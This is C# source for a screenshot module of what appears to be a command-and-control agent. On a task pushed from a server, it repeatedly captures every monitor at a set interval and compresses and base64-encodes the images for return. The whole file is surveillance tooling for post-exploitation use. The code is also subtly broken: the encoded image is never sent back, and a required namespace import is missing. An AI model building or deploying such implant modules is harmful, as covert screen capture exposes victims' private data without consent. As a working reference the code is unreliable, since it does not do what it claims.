using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using screenshot;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "screenshot";
        private IMessageManager messageManager { get; set; }
        private System.Timers.Timer screenshotTimer;
        private CancellationTokenSource cancellationTokenSource;
        private bool isRunning = false;

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);

            try
            {
                if (args.interval == 0)
                {
                    // If the interval is set to 0, cancel the screenshot task if it's running
                    if (isRunning)
                    {
                        cancellationTokenSource.Cancel();
                        isRunning = false;
                        await messageManager.WriteLine("Task has been canceled.", job.task.id, true);
                    }
                    else
                    {
                        // Take a single screenshot
                        await CaptureAndSendScreenshot(job.task.id, CancellationToken.None);
                    }
                }
                else if (args.interval < 0)
                {
                    await messageManager.WriteLine("Invalid interval value. It must be a non-negative integer.", job.task.id, true);
                }
                else
                {
                    // Handle starting a new screenshot task with the specified interval...
                    if (isRunning)
                    {
                        await messageManager.WriteLine("A screenshot task is already running. Wait for it to complete or cancel it.", job.task.id, true);
                    }
                    else
                    {
                        cancellationTokenSource = new CancellationTokenSource(); // Create a new CancellationTokenSource
                        Task.Run(async () =>
                        {
                            isRunning = true;
                            await CaptureScreenshotsWithInterval(args, job.task.id, cancellationTokenSource.Token);
                            isRunning = false;
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                // Handle and log the exception as needed
                await HandleExecutionError(job.task.id, ex);
            }
        }

        private async Task HandleExecutionError(string task_id, Exception ex)
        {
            string errorMessage = $"An error occurred during the execution: {ex.Message}";
            await messageManager.Write(errorMessage, task_id, true, "error");

            // Log the error using your logger
            // logger.LogError(errorMessage);
        }

        private async Task CaptureScreenshotsWithInterval(ScreenshotArgs args, string task_id, CancellationToken token)
        {
            int intervalInSeconds = args.interval;

            while (!token.IsCancellationRequested)
            {
                await CaptureAndSendScreenshot(task_id, token);
                try
                {
                    await Task.Delay(TimeSpan.FromSeconds(intervalInSeconds), token);
                }
                catch (TaskCanceledException)
                {
                    // Task was canceled, exit the loop.
                    break;
                }
            }
        }

        private async Task CaptureAndSendScreenshot(string task_id, CancellationToken token)
        {
            try
            {
                var bitmaps = ScreenCapture.Capture();

                // Determine the size of the combined bitmap
                int combinedWidth = 0;
                int maxHeight = 0;
                foreach (var bitmap in bitmaps)
                {
                    combinedWidth += bitmap.Width;
                    if (bitmap.Height > maxHeight)
                    {
                        maxHeight = bitmap.Height;
                    }
                }

                // Create a new bitmap to hold the combined image
                var combinedBitmap = new Bitmap(combinedWidth, maxHeight);

                // Draw each screen's bitmap onto the combined bitmap
                int x = 0;
                foreach (var bitmap in bitmaps)
                {
                    using (var graphics = Graphics.FromImage(combinedBitmap))
                    {
                        graphics.DrawImage(bitmap, x, 0);
                    }
                    x += bitmap.Width;
                }

                // Convert to base64
                var converter = new ImageConverter();
                var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
                byte[] outputBytes;

                // Compress the image
                using (var memoryStream = new MemoryStream())
                {
                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
                    {
                        gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
                    }
                    outputBytes = memoryStream.ToArray();
                }

                var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);

                // Check for cancellation before adding the response
                if (!token.IsCancellationRequested)
                {
                    await messageManager.WriteLine("Screenshot captured.", task_id, true);
                }
            }
            catch (Exception e)
            {
                // Check for cancellation before reporting the error
                if (!token.IsCancellationRequested)
                {
                    await messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
                }
            }
        }
    }

    internal class ScreenCapture
    {
        internal static List<Bitmap> Capture()
        {
            var bitmaps = new List<Bitmap>();
            foreach (var screen in GetScreens())
            {
                var bitmap = new Bitmap(screen.Width, screen.Height);
                using (var graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(screen.X, screen.Y, 0, 0, bitmap.Size);
                }
                bitmaps.Add(bitmap);
            }
            return bitmaps;
        }

        private static IEnumerable<Screen> GetScreens()
        {
            var screens = new List<Screen>();
            foreach (var displayInfo in GetDisplayInfos())
            {
                var bounds = new Rectangle(
                    displayInfo.Bounds.X,
                    displayInfo.Bounds.Y,
                    displayInfo.Bounds.Width,
                    displayInfo.Bounds.Height);

                screens.Add(new Screen(bounds));
            }
            return screens;
        }

        private class Screen
        {
            public int X { get; }
            public int Y { get; }
            public int Width { get; }
            public int Height { get; }

            public Screen(Rectangle bounds)
            {
                X = bounds.X;
                Y = bounds.Y;
                Width = bounds.Width;
                Height = bounds.Height;
            }
        }

        [DllImport("user32.dll")]
        private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumProc lpfnEnum, IntPtr dwData);

        private delegate bool MonitorEnumProc(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        private class DisplayInfo
        {
            public Rectangle Bounds { get; set; }
        }

        private static List<DisplayInfo> GetDisplayInfos()
        {
            var monitors = new List<DisplayInfo>();

            var proc = new MonitorEnumProc((IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
            {
                var mi = new DisplayInfo();
                mi.Bounds = new Rectangle(lprcMonitor.left, lprcMonitor.top, lprcMonitor.right - lprcMonitor.left, lprcMonitor.bottom - lprcMonitor.top);
                monitors.Add(mi);

                return true;
            });

            if (!EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, proc, IntPtr.Zero))
            {
                throw new System.ComponentModel.Win32Exception();
            }

            return monitors;
        }
    }
}
